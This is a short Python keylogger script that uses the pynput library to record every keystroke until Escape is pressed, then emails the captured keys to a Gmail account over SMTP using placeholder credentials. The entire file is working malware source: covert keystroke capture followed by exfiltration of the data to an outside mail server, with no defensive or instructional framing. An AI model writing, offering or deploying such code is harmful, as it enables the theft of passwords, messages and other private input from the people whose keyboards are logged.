


import smtplib
from pynput.keyboard import Key, Listener


keys = []

def on_press(key):
    global keys, log
    keys.append(key)
    print("{0}pressed".format(key))

#stopping the keylogger

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


#Sends the email with information inside


gmail_user = 'youremailaccountname'
gmail_password = 'youremailpassword'

sent_from = gmail_user
to = ['youremailaccountname']
subject = 'Keylogger Information'
body = keys


email_text = """\
From: %s
To: %s
Subject: %s

%s
""" % (sent_from, ", ".join(to), subject, body)

try:
    smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    smtp_server.ehlo()
    smtp_server.login(gmail_user, gmail_password)
    smtp_server.sendmail(sent_from, to, email_text)
    smtp_server.close()
    print ("Email was sent successfully!")
except Exception as ex:
    print ("Something went wrong….",ex)

    
    
    
    
    
    
